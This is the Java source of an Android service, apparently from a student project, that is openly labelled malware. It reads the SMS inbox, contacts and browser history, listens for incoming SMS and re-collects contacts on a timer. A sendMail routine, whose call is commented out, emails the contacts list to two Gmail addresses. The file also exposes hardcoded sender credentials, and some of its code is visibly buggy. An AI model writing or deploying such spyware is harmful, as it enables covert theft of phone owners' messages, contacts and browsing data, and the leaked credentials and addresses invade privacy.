package com.malware.service;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import com.malware.mail.SendMailTask;
import com.malware.phone.IncomingSMS;


import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.Browser;
import android.provider.ContactsContract;
import android.util.Log;

public class MyService extends Service {

	private IBinder mBinder;
	private boolean mAllowRebind;
	private Timer t;
	private TimerTask tt;
	private static ArrayList<ArrayList<String>> contactsList;

	private final boolean VERBOSE = true;
	private final String TAG = "MalwareService";

	@Override
	public void onCreate() {

		if (VERBOSE) Log.v(TAG, "Creating service");

		// The first time, fetch all sms in memory
		String sms = fetchSMS();
		if (VERBOSE) Log.v(TAG, sms);

		fetchContacts();

		// Prepare task to regularly display the information to hack
		prepareLoop();

		// Create receiver for each incoming sms
		IntentFilter filter = new IntentFilter();
		filter.addAction("android.Telephony.SMS_RECEIVED");
		registerReceiver(new IncomingSMS(), filter);
	}

	private String fetchSMS() {

		if (VERBOSE) Log.d(TAG, "Fetching sms");

		Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
		cursor.moveToFirst();
		String msgData = "";

		if (cursor.getCount() != 0) {
			while(cursor.moveToNext()); {
				for(int idx=0;idx<cursor.getColumnCount();idx++) {
					msgData += " " + cursor.getColumnName(idx) + ":\n" + cursor.getString(idx);
					msgData += "\n\n"; // Just for readability
				}
			}
		} else {
			msgData += "No sms in memory";
		}
		return msgData;
	}

	private void fetchContacts() {

		if (VERBOSE) Log.d(TAG, "Fetching contacts");

		Cursor c = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		String id;
		contactsList = new ArrayList<ArrayList<String>>(c.getCount());
		c.moveToFirst();

		for (int i = 0; i < c.getCount(); i++) {
			ArrayList<String> contactInfo = new ArrayList<String>(2);
			contactInfo.add(0, c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
			id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID));

			if (Integer.parseInt(c.getString(c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
				Cursor pCur = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[] { id }, null);
				while (pCur.moveToNext()) {
					contactInfo.add(1, pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
				}
			}
			contactsList.add(i, contactInfo);
			c.moveToNext();		
		}
		c.close();
	}

	/**
	 * This task enables the service to inform regularly
	 * the hacker of the updates of the list of contacts.
	 */
	private void prepareLoop() {
		t = new Timer();
		tt = new TimerTask() {

			@Override
			public void run() {
				Log.v(TAG, "Coucou, c'est la mise à jour");
				fetchContacts();
				for (int j = 0 ; j < contactsList.size() ; j++) {
					Log.i(TAG, contactsList.get(j).get(0) + " - " + contactsList.get(j).get(1));
				}
			}
		};
	}

	private void sendMail() {
		
		// Gmail address created for the project
		String fromEmail = "ckahckah@gmail.com";
		String fromPassword = "projetinf358";
		
		// Recipients
		String toEmails = "medori.julien@gmail.com, issacamara20@gmail.com";
		List<String> toEmailList = Arrays.asList(toEmails.split("\\s*,\\s*"));
		
		if (VERBOSE) Log.i(TAG, "To List: " + toEmailList);
		
		String emailSubject = "Contacts sur le téléphone";
		String emailBody = "";
		
		for (int j = 0 ; j < contactsList.size() ; j++) {
			emailBody += contactsList.get(j).get(0) + " " + contactsList.get(j).get(1) + "\n\n";
		}
		
		(new SendMailTask()).execute(fromEmail,fromPassword, toEmailList, emailSubject, emailBody);
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		if (VERBOSE) Log.v(TAG, "Starting service");

		t.scheduleAtFixedRate(tt, 5000, 15000);

		if (VERBOSE) Log.i(TAG, "Displaying list of contacts");

		if (contactsList != null) {
			for (int j = 0 ; j < contactsList.size() ; j++) {
				if (VERBOSE) Log.i(TAG, contactsList.get(j).get(0) + " " + contactsList.get(j).get(1));
			}
		}
		
//		sendMail();
		
		return Service.START_STICKY;
	}
	
	private ArrayList<HistoryEntry> getBrowserHistory() {

		String title = "";
		String url = "";

		ArrayList<HistoryEntry> list = new ArrayList<HistoryEntry>();

		String[] proj = new String[] { Browser.BookmarkColumns.TITLE,
				Browser.BookmarkColumns.URL };
		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history,
																// 1 = bookmark
		Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI, proj,
				sel, null, null);
		mCur.moveToFirst();

		if (mCur.moveToFirst() && mCur.getCount() > 0) {
			boolean cont = true;
			while (mCur.isAfterLast() == false && cont) {
				HistoryEntry entry;

				title = mCur.getString(mCur
						.getColumnIndex(Browser.BookmarkColumns.TITLE));
				url = mCur.getString(mCur
						.getColumnIndex(Browser.BookmarkColumns.URL));
				// Do something with title and url
				entry = new HistoryEntry(title, url);
				Log.d("TAG", "title   " + title);
				mCur.moveToNext();
			}
		}

		mCur.close();

		return list;
	}

	public static ArrayList<ArrayList<String>> getContactsList() {
		return contactsList;
	}

	@Override
	public IBinder onBind(Intent intent) {
		// A client is binding to the service with bindService()
		return mBinder;
	}

	@Override
	public boolean onUnbind(Intent intent) {
		// All clients have unbound with unbindService()
		return mAllowRebind;
	}

	@Override
	public void onRebind(Intent intent) {
		// A client is binding to the service with bindService(),
		// after onUnbind() has already been called
	}

	@Override
	public void onDestroy() {
		// The service is no longer used and is being destroyed
		if (VERBOSE) Log.v(TAG, "Destroying service");
		t.cancel();
	}
}

class HistoryEntry {
	String title, url;

	HistoryEntry(String title, String url) {
		this.title = title;
		this.url = url;
	}
}